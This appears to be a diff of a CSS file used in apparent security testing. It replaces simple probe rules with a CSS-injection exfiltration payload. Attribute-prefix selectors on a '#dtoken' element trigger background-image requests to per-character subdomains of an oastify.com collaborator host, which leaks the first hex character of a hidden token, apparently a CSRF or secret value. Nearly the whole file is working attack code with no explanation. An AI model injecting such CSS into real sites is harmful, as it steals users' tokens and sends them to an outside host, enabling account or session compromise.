@@ -1,9 +1,67 @@
-#dtoken{
-	filter:url("https://xxxxxxaaxxxx.geyzrv2ns6p9z9bl2qwky6byyp4gsbg0.oastify.com");
-	
-	background: url([https://xxx.geyzrv2ns6p9z9bl2qwky6byyp4gsbg0.oastify.com](https://xxx.geyzrv2ns6p9z9bl2qwky6byyp4gsbg0.oastify.com));
-	
-	border-image: url([https://xyz.geyzrv2ns6p9z9bl2qwky6byyp4gsbg0.oastify.com](https://xyz.geyzrv2ns6p9z9bl2qwky6byyp4gsbg0.oastify.com) );
-	
-	list-style: url([https://abc.geyzrv2ns6p9z9bl2qwky6byyp4gsbg0.oastify.com](https://abc.geyzrv2ns6p9z9bl2qwky6byyp4gsbg0.oastify.com) );
+meta, head {
+    display: block;
+}
+
+#dtoken[content^="a"]{
+    background: url(https://a.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);
+}
+
+#dtoken[content^="b"]{
+    background: url(https://b.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);
+}
+
+#dtoken[content^="c"]{
+    background: url(https://c.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);
+}
+
+#dtoken[content^="d"]{
+    background: url(https://d.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);
+}
+
+#dtoken[content^="e"]{
+    background: url(https://e.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);
+}
+
+#dtoken[content^="f"]{
+    background: url(https://f.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);
+}
+
+#dtoken[content^="0"]{
+    background: url(https://0.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);   
+}
+
+#dtoken[content^="1"]{
+    background: url(https://1.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);   
+}
+
+#dtoken[content^="2"]{
+    background: url(https://2.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);   
+}
+
+#dtoken[content^="3"]{
+    background: url(https://3.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);   
+}
+
+#dtoken[content^="4"]{
+    background: url(https://4.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);   
+}
+
+#dtoken[content^="5"]{
+    background: url(https://5.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);   
+}
+
+#dtoken[content^="6"]{
+    background: url(https://6.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);   
+}
+
+#dtoken[content^="7"]{
+    background: url(https://7.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);   
+}
+
+#dtoken[content^="8"]{
+    background: url(https://8.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);   
+}
+
+#dtoken[content^="9"]{
+    background: url(https://9.zps4v80hhsnrl7lr3zaimgv5yw4nsdg2.oastify.com/);   
 }
